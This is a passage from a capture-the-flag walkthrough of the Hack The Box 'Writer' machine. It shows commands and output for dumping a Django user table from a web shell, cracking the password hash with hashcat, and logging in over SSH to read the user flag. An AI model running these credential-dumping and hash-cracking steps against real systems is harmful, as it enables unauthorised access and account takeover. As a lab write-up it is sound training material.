# # `Enumeration` -

```bash
www-data@writer:/var/www$ ls -la
total 20
drwxr-xr-x  5 root     root     4096 Jun 22  2021 .
drwxr-xr-x 14 root     root     4096 May 13  2021 ..
drwxr-xr-x  2 root     root     4096 Jun 17  2021 html
drwxr-xr-x  3 www-data www-data 4096 May 17  2021 writer.htb
drwxrws---  6 www-data smbgroup 4096 Aug  2 06:52 writer2_project
www-data@writer:/var/www$ cd writer2_project/
www-data@writer:/var/www/writer2_project$ ls -la
total 32
drwxrws--- 6 www-data smbgroup 4096 Aug  2 06:52 .
drwxr-xr-x 5 root     root     4096 Jun 22  2021 ..
-r-xr-sr-x 1 www-data smbgroup  806 Jan  1 15:04 manage.py
-r-xr-sr-x 1 www-data smbgroup   15 Jan  1 15:04 requirements.txt
dr-xr-sr-x 3 www-data smbgroup 4096 May 16  2021 static
dr-xr-sr-x 4 www-data smbgroup 4096 Jul  9 10:59 staticfiles
dr-xr-sr-x 4 www-data smbgroup 4096 May 19  2021 writer_web
dr-xr-sr-x 3 www-data smbgroup 4096 May 19  2021 writerv2
```

`manage.py` indicates that it is a django web framework -

```bash
www-data@writer:/var/www/writer2_project$ cat manage.py 
#!/usr/bin/env python
import os
import sys

if __name__ == "__main__":
    os.environ.setdefault("DJANGO_SETTINGS_MODULE", "writerv2.settings")
    try:
        from django.core.management import execute_from_command_line
    except ImportError:
        # The above import may fail for some other reason. Ensure that the
        # issue is really that Django is missing to avoid masking other
        # exceptions on Python 2.
        try:
            import django
        except ImportError:
            raise ImportError(
                "Couldn't import Django. Are you sure it's installed and "
                "available on your PYTHONPATH environment variable? Did you "
                "forget to activate a virtual environment?"
            )
        raise
    execute_from_command_line(sys.argv)
```

- #### `Database` -

```bash
www-data@writer:/var/www/writer2_project$ python3 manage.py dbshell
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 20788
Server version: 10.3.29-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [dev]> show databases;
+--------------------+
| Database           |
+--------------------+
| dev                |
| information_schema |
+--------------------+
2 rows in set (0.000 sec)
MariaDB [dev]> show tables;
+----------------------------+
| Tables_in_dev              |
+----------------------------+
| auth_group                 |
| auth_group_permissions     |
| auth_permission            |
| auth_user                  |
| auth_user_groups           |
| auth_user_user_permissions |
| django_admin_log           |
| django_content_type        |
| django_migrations          |
| django_session             |
+----------------------------+
10 rows in set (0.001 sec)
MariaDB [dev]> select * from auth_user;
+----+------------------------------------------------------------------------------------------+------------+--------------+----------+------------+-----------+-----------------+----------+-----------+----------------------------+
| id | password                                                                                 | last_login | is_superuser | username | first_name | last_name | email           | is_staff | is_active | date_joined                |
+----+------------------------------------------------------------------------------------------+------------+--------------+----------+------------+-----------+-----------------+----------+-----------+----------------------------+
|  1 | pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A= | NULL       |            1 | kyle     |            |           | kyle@writer.htb |        1 |         1 | 2021-05-19 12:41:37.168368 |
+----+------------------------------------------------------------------------------------------+------------+--------------+----------+------------+-----------+-----------------+----------+-----------+----------------------------+
1 row in set (0.000 sec)
```

We got a hash.

Using hashcat to crack it -

```bash
root@napster:~/Documents/HTB/Writer# hashcat -m 10000 writer.hash --wordlist /usr/share/wordlists/rockyou.txt
hashcat (v6.1.1) starting...
<snip>
pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A=:marcoantonio
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: Django (PBKDF2-SHA256)
Hash.Target......: pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8...uXM4A=
Time.Started.....: Sat Jan  1 10:13:14 2022 (2 mins, 58 secs)
Time.Estimated...: Sat Jan  1 10:16:12 2022 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:       53 H/s (8.87ms) @ Accel:32 Loops:1024 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 9472/14344385 (0.07%)
Rejected.........: 0/9472 (0.00%)
Restore.Point....: 9344/14344385 (0.07%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:259072-259999
Candidates.#1....: jodete -> lamisma
<snip>
```

And we got the password for user kyle : `marcoantonio`

# `User` -

```bash
root@napster:~/Documents/HTB/Writer# ssh kyle@10.10.11.101
The authenticity of host '10.10.11.101 (10.10.11.101)' can't be established.
ECDSA key fingerprint is SHA256:GX5VjVDTWG6hUw9+T11QNDaoU0z5z9ENmryyyroNIBI.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.101' (ECDSA) to the list of known hosts.
kyle@10.10.11.101's password:
kyle@writer:~$ ls -la
total 28
drwxr-xr-x 3 kyle kyle 4096 Aug  5 09:59 .
drwxr-xr-x 4 root root 4096 Jul  9 10:59 ..
lrwxrwxrwx 1 root root    9 May 18  2021 .bash_history -> /dev/null
-rw-r--r-- 1 kyle kyle  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 kyle kyle 3771 Feb 25  2020 .bashrc
drwx------ 2 kyle kyle 4096 Jul 28 09:03 .cache
-rw-r--r-- 1 kyle kyle  807 Feb 25  2020 .profile
-r-------- 1 kyle kyle   33 Dec 31 06:18 user.txt
kyle@writer:~$ cat user.txt 
49d3aafe01d4746243bf9251181f47d3
```